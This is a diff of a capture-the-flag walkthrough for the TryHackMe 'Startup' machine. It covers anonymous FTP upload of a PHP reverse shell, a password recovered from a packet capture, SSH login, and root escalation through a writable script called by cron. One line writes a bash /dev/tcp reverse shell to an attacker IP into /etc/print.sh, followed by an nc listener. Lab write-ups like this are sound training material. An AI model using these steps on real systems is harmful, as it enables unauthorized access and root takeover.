@@ -39,7 +39,7 @@ From the output, we can see we have 3 ports open. FTP is running on port 21 and 
 <img src="/assets/img/startup/ftp-dir-1.png" width="350"/>
 </p>
 
-In analyze of FTP service,  dir -a is used to list all files and folders, even the hidden ones. As we can see few files and we can read them looking at the permission on the left side, lets download them to our box.
+In analyze of FTP service,  dir -a is used to list all files and folders, even the hidden ones. As few files and read them looking at the permission on the left side, lets download them to our box.
 
 ### Downloading files from ftp
 
@@ -89,7 +89,7 @@ Here, I decided to brute-force the directory using the wfuzz tool.
 <img src="/assets/img/startup/files-dir.png" width="350"/>
 </p>
 
-Well this looks interesting as this contains the files and folders from FTP service. If we have a write permission on that FTP server, we can upload a PHP script on the webserver.
+Well this looks interesting as this contains the files and folders from FTP service. Write permission on that FTP server, upload a PHP script on the webserver.
 
 ### Revisiting the FTP server 
 
@@ -101,10 +101,15 @@ Well this looks interesting as this contains the files and folders from FTP serv
 
 ### Content of shell.php
 
-Download <a class="link-a" href="https://github.com/safwanpaloli/Reverse-shell/blob/main/php-reverse-shell">PHP SHELL</a>
-
+Download <a class="link-a" href="https://github.com/safwanpaloli/Reverse-shell/blob/main/php-reverse-shell" target="_blank">PHP SHELL</a>
 
 In php-shell script replace the IP and ports with our own ip and ports address.
+
+Check the local system IP address
+
+<p align="left">
+<img src="/assets/img/startup/ip.png" width="350"/>
+</p>
 
 <p align="left">
 <img src="/assets/img/startup/php-shell.png" width="350"/>
@@ -150,7 +155,7 @@ We found a file that gives us the secret ingredient of the recipe.
 <img src="/assets/img/startup/reciept.png" width="350"/>
 </p>
 
-The shell is not interactive, so it is a bit difficult to use. It lacks using arrow keys, autocompletion, and using keys like CTRL+C to kill a process. So We have to make this session a interactive session.
+The shell is not interactive, so it is a bit difficult to work with. It lacks using arrow keys, autocompletion, and using keys like CTRL+C to kill a process. Make this a more interactive session.
 
 
 ### Getting a proper TTY
@@ -171,7 +176,7 @@ Now we have a proper shell.
 
 ### Privilege Escalation
 
-The first thing we can do is run scripts like linpeas or LinEnum to find out the potential privilege Escalation vectors. I personally like linpeas as it has coloring which makes life easier. As the box on THM doesnot have internet,we have to first download the script on our box, open up a python HTTP server and download on the remote box.
+Run linpeas or LinEnum scripts to identify possible privilege escalation point-to-point vectors. Linpeas has color highlighting so it makes life easier; open a python HTTP server and download the script from the remote machine.
 
 ### Download linpeas.sh
 
@@ -219,17 +224,17 @@ lets run the script.
 <img src="/assets/img/startup/dir-incidents.png" width="350"/>
 </p>
 
-A pcapng file on /incidents folder. Now to analyse the file,we have to download <a class="link-a" href="https://www.wireshark.org/#download">this</a> file to our box and then we can use wireshark to check the content of this file. Check this  for downloading and installation instruction.
+A pcapng file on /incidents folder. Now to analyse the file, download <a class="link-a" href="https://www.wireshark.org/#download">this</a> file to our machine and then use Wireshark to check the content of this file. Check this for downloading and installation instructions.
   
-Open an HTTP server in Python on the remote box just as we did before, and download the file from our machine.
- 
+As before, open an HTTP server in Python on the remote machine, and download the file from our machine. 
+
 ### Run HTTP server on the remote box 
  
 <p align="left">
 <img src="/assets/img/startup/python-server.png" width="350"/>
 </p>
  
-### Downloading file on our box
+### Download file on our machine
 
 <p align="left">
 <img src="/assets/img/startup/file-download-suspicious.png" width="350"/>
@@ -243,7 +248,7 @@ Open an HTTP server in Python on the remote box just as we did before, and downl
 <img src="/assets/img/startup/ezgif.com-gif-maker.gif" width="450"/>
 </p>
 
-In content of the stream lennie's password
+The content of the stream contains lennie's password. 
 
 <p align="left">
 <img src="/assets/img/startup/suspious-lennie-password.png" width="350"/>
@@ -252,7 +257,7 @@ In content of the stream lennie's password
 
 ### Login SSH service 
 
-SSH, also known as Secure Shell or Secure Socket Shell, is a network protocol that gives users, particularly system administrators, a secure way to access a computer over an unsecured network.default port number is 22.
+SSH, also known as Secure Shell or Secure Socket Shell, is a network protocol that gives users, particularly system administrators, a secure way to access a computer over an unsecured network. Default port number is 22.
 
 > ssh lennie@startup.thm 
 
@@ -260,9 +265,7 @@ SSH, also known as Secure Shell or Secure Socket Shell, is a network protocol th
 <img src="/assets/img/startup/ssh-login.png" width="350"/>
 </p>
 
-list the files using `ls` command 
-
-There is files and directory. read user.txt
+List the files using `ls` command. There is files and directory. read user.txt
 
 <p align="left">
 <img src="/assets/img/startup/user.txt.png" width="350"/>
@@ -276,7 +279,7 @@ Looking under lennie’s home directory, folder named `scripts`.
 <img src="/assets/img/startup/list-all-lennie.png" width="350"/>
 </p>
 
-Script named `planner.sh` Reading this file makes me believe that a cronjob is running
+Reading the script named `planner.sh` makes it clear that a cronjob is running
 
 <p align="left">
 <img src="/assets/img/startup/list-all-lennie.png" width="350"/>
@@ -294,7 +297,7 @@ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
 <img src="/assets/img/startup/pspy64-download.png" width="350"/>
 </p>
 
-### Uploading file to the remote box
+### Uploading file to the remote machine
 
 ```
 scp pspy64 lennie@startup.thm:/dev/thm/pspy64
@@ -305,7 +308,7 @@ scp pspy64 lennie@startup.thm:/dev/thm/pspy64
 <img src="/assets/img/startup/scp-psy.png" width="350"/>
 </p>
 
-file make a executable and run it. Wait for the cron to run and the pspy will show the result.
+Make an executable file and run it. Wait for the cron to run, then pspy will show the result.
 
 > chmod +x pspy64
 
@@ -325,7 +328,8 @@ file make a executable and run it. Wait for the cron to run and the pspy will sh
 <img src="/assets/img/startup/cron-job.png" width="450"/>
 </p>
 
-Edit planner.sh with a reverse shell, it will gain root access. When trying to edit the file, find that root owns it and is the only one who has access to it.
+
+Edit planner.sh with a reverse shell, it will gain root access. Trying to edit a file, notified that root owns it, and that is the only person who can edit it.
 
 <p align="left">
 <img src="/assets/img/startup/ls-planner.png" width="450"/>
@@ -343,13 +347,13 @@ Looking at /etc/print.sh and find lennie is allowed to edit this file
 <img src="/assets/img/startup/ls-print.png" width="450"/>
 </p>
 
-Perfect, now edit the file so that when root runs planner.sh it will also execute print.sh. Create a reverse shell command using the <a class="link-a" href="https://github.com/safwanpaloli/Reverse-shell/blob/main/Reverse%20shell%20payloads">Reverse Shell Cheatsheet</a>, editing only the local IP address of your system
+Perfect, now edit the file so that when root runs planner.sh it will also execute print.sh. Create a reverse shell command using the <a class="link-a" href="https://github.com/safwanpaloli/Reverse-shell/blob/main/Reverse%20shell%20payloads">Reverse Shell Cheatsheet</a>, editing only the local machine IP address.
 
 ```
 echo 'bash -c "bash -i >& /dev/tcp/10.2.99.122/8001 0>&1"' > /etc/print.sh
 ```
 
-set up a nc listener and wait around a minute for a callback
+Set up a nc listener and wait around a minute for a callback
 
 > nc -lvnp 8001
 
